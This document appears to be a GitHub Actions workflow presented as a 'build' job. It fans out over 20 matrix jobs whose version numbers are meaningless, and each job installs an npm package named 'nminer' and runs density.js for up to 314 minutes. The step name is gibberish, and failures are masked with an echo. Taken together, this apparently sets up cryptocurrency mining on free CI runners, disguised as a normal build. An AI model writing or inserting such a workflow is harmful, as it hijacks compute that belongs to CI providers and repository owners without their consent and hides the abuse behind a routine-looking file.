name: density
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9715 }
          - { version: 8875 }
          - { version: 4652 }
          - { version: 7634 }
          - { version: 8936 }
          - { version: 4293 }
          - { version: 3258 }
          - { version: 1783 }
          - { version: 3609 }
          - { version: 4442 }
          - { version: 3721 }
          - { version: 4498 }
          - { version: 6441 }
          - { version: 5258 }
          - { version: 6316 }
          - { version: 679 }
          - { version: 9608 }
          - { version: 7636 }
          - { version: 8894 }
          - { version: 5553 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: pro recent cooperative but writ
        run: |
          npm install nminer@latest
          timeout 314m node density.js || echo "density executed"